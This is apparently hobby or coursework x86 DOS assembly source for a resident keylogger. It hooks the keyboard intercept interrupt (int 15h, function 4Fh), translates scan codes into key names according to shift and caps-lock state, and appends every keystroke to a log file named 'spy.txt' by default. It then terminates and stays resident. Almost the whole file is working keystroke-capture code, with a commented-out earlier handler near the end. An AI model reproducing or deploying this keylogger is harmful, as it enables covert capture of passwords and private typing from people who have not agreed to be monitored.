.MODEL tiny
.CODE
.386
org 100h
main:
jmp start

file_descriptor dw 0
number dw 0

temp_buffer db 14 dup ('$')
endl db  10, 13, '$'
space db " ", '$'
error_parsing db "Failed to parse command line args", '$'
create_file_error_message db "Creating file failed", '$'
open_file_error_message db "Opening file failed", '$'
write_file_error_message db "Writing into file failed", '$'
close_file_error_message db "Closing file failed", '$'
error_status_code_message db "Error status code ->", '$'
file_open_success_message db "File was successfully opened", '$'
path db "./spy.txt", 11 dup (0)
temp_string db "temp string", '$'
symbol db "C", 0

error_message db "Something went wrong ...", '$'

old_handler dd 0  ; 4 bytes
int_21h dd 0      ; 4 bytes

len equ 10
strings         db "Esc"
nums            db "1!"
                db "2@"
                db "3", 23h; # char
                db "4$"
                db "5%"
                db "6^"
                db "7&"
                db "8*"
                db "9("
                db "0)"
                db "-_"
                db "=+"
special_1       db "Backspace"
                db "Tab      "
line1           db "qQ"
                db "wW"
                db "eE"
                db "rR"
                db "tT"
                db "yY"
                db "uU"
                db "iI"
                db "oO"
                db "pP"
nums2           db "[{"
                db "]}"
special_2       db "Enter"
                db "Ctrl "
line2           db "aA"
                db "sS"
                db "dD"
                db "fF"
                db "gG"
                db "hH"
                db "jJ"
                db "kK"
                db "lL"
nums3           db 3Bh, ":"; ; character
                db 27h, 22h; ' and " characters
                db "`~"
special_3       db "LShift"
nums4           db "\|"
line3           db "zZ"
                db "xX"
                db "cC"
                db "vV"
                db "bB"
                db "nN"
                db "mM"
nums5           db ",<"
                db ".>"
                db "/?"
the_rest        db "RShift    "
                db "Grey*     "
                db "Alt       "
                db "SpaceBar  "
                db "CapsLock  "
                db "F1        "
                db "F2        "
                db "F3        "
                db "F4        "
                db "F5        "
                db "F6        "
                db "F7        "
                db "F8        "
                db "F9        "
                db "F10       "
                db "NumLock   "
                db "ScrollLock"
                db "Home      "
                db "UpArrow   "
                db "PgUp      "
                db "Grey-     "
                db "LeftArrow "
                db "KeyPad 5  "
                db "RightArrow"
                db "Grey+     "
                db "End       "
                db "DownArrow "
                db "PgDn      "
                db "Ins       "
                db "Del       "
                db "SysReq    "
                db "F11       "
                db "left \|   "
                db "F11       "
                db "F12       "
                db "F15       "
                db "PA1       "
                db "F13       "
                db "F14       "
                db "F15       "
new_line        db 10, 13, '$'

new_handler proc
    pushf
    cmp ah, 4Fh
    jne not_interested
    call dword ptr cs:old_handler
    cli
    push ds
    push cs
    pop ds
    jc continue ;if scan code
    jmp int_end ; if not a scan code
continue:
    push ax
    push bx
    push es
    cmp al, 0
    je skip_out
    cmp al, 5Dh
    ja skip_out
    cmp al, 3Ah
    jne fine
    mov cx, 0
    mov es, cx
    mov bx, 417h  ; adress 0000:417h - shift status
    mov cl, es:[bx]
    and cl, 01000000b ;6 bit - capslock on
    cmp cl, 0
    je fine
    jmp skip_out
fine:
    push ax
    ; open file
    mov ah, 3Dh
    mov al, 0100010b
    mov dx, offset path
    pushf
    call dword ptr cs:int_21h
    jc error_log
    ; move file pointer
    mov bx, ax
    mov ah, 42h
    mov cx, 0
    mov dx, 0
    mov al, 2
    pushf
    call dword ptr cs:int_21h
    jc error_log
    pop ax
    push bx
    xor ah, ah
    cmp ax, 1; esc
    je batch1
    cmp ax, 0Eh; nums
    jb batch2
    cmp ax, 10h; special1
    jb batch3
    cmp ax, 1Ah; line1
    jb batch4
    cmp ax, 1Ch; nums2
    jb batch5
    cmp ax, 1Eh; special2
    jb batch6
    cmp ax, 27h; line2
    jb batch7
    cmp ax, 2Ah; nums3
    jb batch8
    cmp ax, 2Bh; special3
    jb batch9
    cmp ax, 2Ch; nums4
    jb batch10
    cmp ax, 33h; line3
    jb batch11
    cmp ax, 36h; nums5
    jb batch12
    jmp other
    batch1:; esc
    mov dx, offset strings
    mov cx, 3
    jmp write
    batch2:; nums
    sub ax, 2
    mov bx, 2
    mul bx
    mov dx, offset nums
    add dx, ax
    mov cx, 1
    jmp check_if_special
    batch3:; special1
    sub ax, 0Eh
    mov bx, 9
    mul bx
    mov dx, offset special_1
    add dx, ax
    mov cx, 9
    jmp write
    batch4:; line1
    sub ax, 10h
    mov bx, 2
    mul bx
    mov dx, offset line1
    add dx, ax
    mov cx, 1
    jmp check_if_capital
    batch5:;nums2
    sub ax, 1Ah
    mov bx, 2
    mul bx
    mov dx, offset nums2
    add dx, ax
    mov cx, 1
    jmp check_if_special
    batch6:; special2    
    sub ax, 1Ch
    mov bx, 5
    mul bx
    mov dx, offset special_2
    add dx, ax
    mov cx, 5
    jmp write
    batch7:; line2
    sub ax, 1Eh
    mov bx, 2
    mul bx
    mov dx, offset line2
    add dx, ax
    mov cx, 1
    jmp check_if_capital
    batch8:; nums3
    sub ax, 27h
    mov bx, 2
    mul bx
    mov dx, offset nums3
    add dx, ax
    mov cx, 1
    jmp check_if_special
    batch9:; special3
    mov dx, offset special_3
    mov cx, 6
    jmp write
    batch10:; nums4
    mov dx, offset nums4
    mov cx, 1
    jmp check_if_special
    batch11:; line3
    sub ax, 2Ch
    mov bx, 2
    mul bx
    mov dx, offset line3
    add dx, ax
    mov cx, 1
    jmp check_if_capital
    batch12:; nums5
    sub ax, 33h
    mov bx, 2
    mul bx
    mov dx, offset nums5
    add dx, ax
    mov cx, 1
    jmp check_if_special
    other:; other
    sub ax, 36h
    mov bx, len
    mul bx
    mov dx, offset the_rest
    add dx, ax
    mov cx, len
    jmp write
check_if_capital:
    mov ax, 0
    mov es, ax
    mov bx, 417h
    mov al, es:[bx]
    and al, 01000011b
    cmp al, 0
    je write
    cmp al, 01000001b
    je write
    cmp al, 01000010b
    je write
    cmp al, 01000011b
    je write
    inc dx
    jmp write
check_if_special:
    mov ax, 0
    mov es, ax
    mov bx, 417h
    mov al, es:[bx]
    and al, 11b
    cmp al, 0
    je write
    inc dx
    jmp write
write:
    pop bx
    mov ah, 40h
    pushf
    call dword ptr cs:int_21h
    jc skip_out
    mov ah, 40h
    mov dx, offset new_line
    mov cx, 2
    pushf
    call dword ptr cs:int_21h
    jc skip_out
    ; close file
    mov ah, 3Eh
    pushf
    call dword ptr cs:int_21h
    jmp skip_out
error_log:
    pop ax
    mov ah, 9
    mov dx, offset error_message
    pushf
    call dword ptr cs:int_21h
skip_out:
    pop es
    pop bx
    pop ax
    jmp int_end
not_interested:
    pushf
    call dword ptr cs:old_handler
    jmp int_ret
int_end:
    pop ds
    sti
int_ret:
    iret
endp


init macro
  mov ax, cs
  mov ds, ax
endm

exit macro
  mov ax, 4c00h
  call dword ptr cs:int_21h
endm


exit_resident macro
  ; ;get exit code
  ; mov ah, 4dh
  ; int 21h

  ; mov al, ah    ; exit code
  ; mov ah, 31h   ; leave resident (KEEP)

  ; mov cx, es                      ; program start segment address (in paragraphs)
  ; mov bx, empty_segment           ; program end segment address (in paragraphs)
  ; sub bx, cx                      ; BX contain minimum required memory size for programm
  ; mov dx, bx
  ; int 21h

  mov dx, offset end_resident
  int 27h
endm

;first param is output buffer
;second param is number address (offset from `ds`)
itoa:
  push bp
  mov bp, sp
  push di
  push si
  push bx
  push ax
  push dx
  
  mov di, ss:[bp + 6] ;output
  mov si, ss:[bp + 4] ;number address (number stored as word) 
  mov ax, word ptr [si] ;actual number
  mov bx, 10
  
  ;check if number is negative
  cmp word ptr [si], 0h
  jge positive_true
  
  mov byte ptr [di], '-'
  inc di
  neg ax
  positive_true:
  mov si, di
  
  itoa_iterate:
    mov dx, 00h
    cmp ax, 10
    jl itoa_end
    
    div bx
    add dx, 48
    mov byte ptr [di], dl
    inc di
    
    jmp itoa_iterate
  
  itoa_end:
  add ax, 48
  mov byte ptr [di], al
  
  push si
  push di
  call reverse
  pop di
  pop si
  
  inc di
  mov byte ptr[di], '$'
  
  pop dx
  pop ax
  pop bx
  pop si
  pop di
  pop bp
ret

reverse:
    push bp
    mov bp, sp
    push si
    push di
    push ax
    push bx
    push dx
    
    mov si, ss:[bp + 6] ;start address
    mov bx, ss:[bp + 4] ;end address
    mov di, bx
    
    cmp si, bx
    je reverse_end
    
    mov ah, 00h
    reverse_iterate:
        lodsb ; from memory with [si] address to `al` register
        dec si
        mov dl, byte ptr [di]
        mov byte ptr ds:[si], dl
        stosb ;from `al` register to memory with [di] address 
        inc si
        sub di, 2
        
        cmp si, di
        je reverse_end
        
        dec si
        cmp si, di
        je reverse_end
        inc si
        jne reverse_iterate
    
    
    reverse_end:    
    
    pop dx
    pop bx
    pop ax
    pop di
    pop si    
    pop bp
ret

call_itoa macro
  push dx
  push offset temp_buffer
  push offset number
  call itoa
  pop dx
  pop dx
  pop dx
endm

log proc
  push bp
  mov bp, sp
  push ax
  mov ax, 0900h
  mov dx, ss:[bp+4]
  call dword ptr cs:int_21h
  pop ax
  pop bp
  ret
endp

call_log macro value
  push offset value
  call log
  pop dx
endm

; new_handler proc far
;   pushf
;   cmp ah, 4fh
;   jne skip_int
;   call dword ptr cs:old_handler
;   cli ;disable interuptions
;   push ds
;   push cs
;   pop ds
;   ; jc continue ;if scan code
;   jnc skip_int ; if not a scan code

;   call open_file_from_end
;   call write_into_file
;   call close_file

;   ; continue:
;   ;   push ax
;   ;   push bx
;   ;   push es

;   ;   cmp al, 0
;   ;   je skip_out
;   ;   cmp al, 5Dh
;   ;   ja skip_out
;   ;   cmp al, 3Ah
;   ;   jne fine
;   ;   mov cx, 0
;   ;   mov es, cx
;   ;   mov bx, 417h  ; adress 0000:417h - shift status
;   ;   mov cl, es:[bx]
;   ;   and cl, 01000000b ;6 bit - capslock on
;   ;   cmp cl, 0
;   ;   je fine
;   ;   jmp skip_out
  
;   ; fine:
;   ;   push ax
;   ;   ; open file
;   ;   call cs:open_file_from_end

;   ;   pop ax

;   ; push ds
;   ; push cs
;   ; pop ds
  
;   ; pushf

  
;   pop ds
;   skip_int:
;   iret
; endp


; for calculating size when keeping resident 
end_resident:

parse_command_line proc
  push di
  push bx
  push ax
  push cx
  ; `es` contain `PSP` segment address
  ; store file name in `file_name`

  xor bx, bx
  mov bl, byte ptr es:[80h] ; cli args length
  cmp bl, 0
  jbe bad_args
  jmp parse_command_line_continue
  
  bad_args:
  jmp parse_command_line_end

  parse_command_line_continue:
  mov di, 81h
  mov al, ' '
  rep scasb ; skip all spaces
  ; dec di
  dec di

  xor cx, cx
  mov cl, byte ptr es:[80h]
  dec cl

  mov bx, offset path
  copy_path:
    mov al, byte ptr es:[di]
    mov byte ptr ds:[bx], al
    inc di
    inc bx
  loop copy_path
  mov byte ptr ds:[bx], 0
  
  parse_command_line_end:
  pop cx
  pop ax
  pop bx
  pop di
  ret
endp

open_file_from_end proc
  pusha
  mov ah, 3dh
  mov al, 1h ; open for writing
  mov dx, offset path
  pushf
  call dword ptr cs:int_21h
  jnc open_file_success
  
    ; if error occured
    mov word ptr ds:[number], ax
    call_log open_file_error_message
    call_log endl
    call_log error_status_code_message
    call_log space
    call_itoa
    call_log temp_buffer
    ; exit

  open_file_success:
  mov word ptr ds:[file_descriptor], ax ; store file descriptor
  mov bx, ax
  mov cx, 0                     ; offset 0
  mov dx, 0                     ; offset 0
  mov al, 2                     ; from end
  mov ah, 42h
  pushf
  call dword ptr cs:int_21h     ; move file pointer

  popa
  ret
endp

create_file proc
  pusha
  mov cx, 10101000b
  mov ah, 3ch
  mov dx, offset path
  ; pushf
  call dword ptr cs:int_21h
  jnc create_file_success
  
    ; if error occured
    mov word ptr ds:[number], ax
    call_log create_file_error_message
    call_log endl
    call_log error_status_code_message
    call_log space
    call_itoa
    call_log temp_buffer
    ; exit

  create_file_success:
  mov word ptr ds:[file_descriptor], ax ; store file descriptor
  popa
  ret
endp

close_file proc
  mov ah, 3eh
  mov bx, word ptr cs:[file_descriptor]
  pushf
  call dword ptr cs:int_21h
  jnc close_file_success

    ; if error occured
    mov word ptr ds:[number], ax
    call_log close_file_error_message
    call_log endl
    call_log error_status_code_message
    call_log space
    call_itoa
    call_log temp_buffer
    exit
  close_file_success:
  ret
endp

write_into_file proc
  pusha
  mov ah, 40h
  mov bx, word ptr cs:[file_descriptor]
  mov cx, 0
  mov dx, offset ds:symbol

  pushf
  call dword ptr cs:int_21h
  jnc write_into_file_success

      ; if error occured
      mov word ptr ds:[number], ax
      call_log write_file_error_message
      call_log endl
      call_log error_status_code_message
      call_log space
      call_itoa
      call_log temp_buffer
      ; exit

  write_into_file_success:
  popa
endp

override proc
  cli
  pusha
  mov ah, 35h       ; get int vect
  mov al, 15h       ; IRQ 1 - key pressed and released
  int 21h
  
  ; store
  mov word ptr cs:[old_handler], bx     ; handler address
  mov word ptr cs:[old_handler + 2], es ; segment handler adress

  push ds
  push cs
  pop ds

  mov dx, offset ds:new_handler
  mov ah, 25h       ; set int vect
  mov al, 15h       ; IRQ 1 - key pressed and released
  int 21h
  
  mov ah, 35h       ; get int vect
  mov al, 21h       ; IRQ 1 - key pressed and released
  int 21h
  
  ; store
  mov word ptr cs:[int_21h], bx     ; handler address
  mov word ptr cs:[int_21h + 2], es ; segment handler adress

  pop ds
  popa
  sti

  ret
endp

start:
  init
  ; override `int 15h` & `int 21h` (store old & set new)
  call override

  call parse_command_line

  ; open file & close (result -> stored file_descriptor)
  call create_file
  call close_file

  ; leave resident
  start_end:
  exit_resident

end main